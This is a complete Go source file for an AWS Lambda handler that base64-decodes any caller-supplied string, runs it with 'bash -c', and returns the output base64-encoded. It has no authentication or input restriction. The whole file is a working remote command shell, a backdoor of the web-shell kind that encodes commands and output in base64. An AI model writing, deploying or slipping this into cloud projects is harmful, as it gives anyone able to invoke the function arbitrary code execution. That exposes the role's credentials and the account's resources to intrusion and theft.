package main

import (
	"encoding/base64"
	"os/exec"

	"github.com/aws/aws-lambda-go/lambda"
)

type Response struct {
	Output string `json:"output"`
}

type Request struct {
	Input string `json:"input"`
}

func HandleLambdaEvent(req Request) (Response, error) {
	// Base64 Decode Input
	inputDec, inputErr := base64.StdEncoding.DecodeString(req.Input)
	if inputErr != nil {
		panic(inputErr)
	}
	// Exec Command
	//cmd := exec.CommandContext(r.Context(), "bash", "-c", string(inputDec))
	cmd := exec.Command("bash", "-c", string(inputDec))
	cmdOut, cmdErr := cmd.Output()
	if cmdErr != nil {
		panic(cmdErr)
	}
	// Base64 Encode Output
	outputEnc := base64.StdEncoding.EncodeToString([]byte(cmdOut))
	// HTTP Response
	return Response{string(outputEnc)}, nil
}

func main() {
	lambda.Start(HandleLambdaEvent)
}
